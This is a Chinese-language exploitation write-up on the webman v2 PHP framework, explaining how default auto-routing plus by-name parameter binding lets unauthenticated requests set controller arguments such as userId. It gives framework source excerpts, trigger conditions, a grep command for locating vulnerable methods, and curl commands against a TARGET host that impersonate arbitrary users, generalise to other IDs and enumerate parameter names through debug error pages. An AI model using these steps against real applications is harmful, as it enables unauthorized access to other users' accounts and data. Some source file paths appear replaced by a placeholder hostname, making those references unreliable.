## 原理（源码级）

webman v2 的控制器调用链：
1. `Webman\App::getCallback()` 判定是否需要"参数注入"（`isNeedInject()`）；
2. 需要注入时走 `Webman\App::resolveInject()`：

```php
// webman-framework src/target150.example.com:391-399
protected static function resolveInject(string $plugin, $call, $args): Closure
{
    return function (Request $request) use ($plugin, $call, $args) {
        $reflector = static::getReflector($call);
        $args = array_values(static::resolveMethodDependencies(static::container($plugin), $request,
            array_merge($request->all(), $args), $reflector, static::config($plugin, 'app.debug')));
        return $call(...$args);
    };
}
```

3. `resolveMethodDependencies()` **按形参名**从 `$inputs` 取值：

```php
// webman-framework src/target150.example.com:498-537
foreach ($reflector->getParameters() as $parameter) {
    $parameterName = $parameter->name;
    $typeName = $parameter->getType()?->getName();
    if ($typeName && is_a($request, $typeName)) { $parameters[$parameterName] = $request; continue; }
    if (!array_key_exists($parameterName, $inputs)) { /* 无默认值 -> MissingInputException */ }
    $parameterValue = $inputs[$parameterName] ?? null;
    case 'int':    if (!is_numeric($parameterValue)) throw InputTypeException;
                   $parameters[$parameterName] = (int)$parameterValue; break;
    case 'string': $parameters[$parameterName] = $parameterValue; break;
    ...
}
```

关键点：`$inputs = array_merge($request->all(), $args)`，而 **`$request->all() = get() + post()`**，即 **GET/POST 全部参数**。
路由参数（`$args`）优先，但**自动路由（default route）没有路由参数**，所以 `$inputs` 就是纯攻击者输入。

**结论：webman 自动路由下，控制器 public 方法的标量形参 = 攻击者可控（按参数名）。**

## 触发条件（三个都满足就中）

1. 主应用**未** `Route::disableDefaultRoute()`（webman 默认开启自动路由）；
2. 目标控制器方法在自动路由可达的命名空间（`app\controller\<...>`），且是 `public`；
3. 该方法**除 Request 之外还有标量形参**，且方法体内**用这个形参当身份/路径/ID**（不做鉴权）。

自查（找靶点里的位置）：
```bash
# 列出所有"有标量形参"的控制器 public 方法
grep -rn "public function" app/controller plugin/*/app/controller | grep -E "function [a-zA-Z]+\([^)]*\\\$[a-z_]+[^)]*\)"
```
在 example 上，唯一形参为身份字段且无鉴权的是：
`app\controller\api\UserController::recordDevice(int $userId, Request $request)`。

## 利用

```bash
# 负控1：缺参 -> MissingInputException
curl -k "https://TARGET/api/user/recordDevice"
# → 200 <h1>Missing input parameter </h1>

# 负控2：类型不符 -> 框架直接点出形参名
curl -k "https://TARGET/api/user/recordDevice?userId=abc"
# → 200 <h1>Input userId must be of type int, string given</h1>

# 注入（零凭证，任意 uid）：
curl -k "https://TARGET/api/user/recordDevice?userId=1"
```
POST/JSON 同样有效：`{"userId":1}`。数组也能喂：`?userId[]=1`（array 形的形参）。

## 通用化：不止 uid

任何形参都是注入面。把 `$id / $orderNo / $code / $path / $name / $username` 之类形参喂进去即可：
```bash
curl -k "https://TARGET/api/<controller>/<action>?id=1"
curl -k "https://TARGET/api/<controller>/<action>?order_no=XXXX"
```
即"自动路由 + 形参绑定"= 未授权 IDOR/身份注入的通用入口。

## 附带发现：报错页自曝参数名
webman debug 模式下 `MissingInputException` / `InputTypeException` 会把形参名与期望类型渲染成 HTML 错误页，
是**零成本枚举控制器方法签名**的手段：对一个方法名逐个试探参数名即可反推签名。

## 其他框架的同类点（换靶标自查）
- ThinkPHP/Laravel 的 implicit binding 仅对模型生效，风险低；
- 但**自研"参数注入"中间件**（`foreach ($inputs as $k=>$v) $args[$k]=$v`）是同类，需看 `ReflectionFunction::getParameters()` 的绑定逻辑。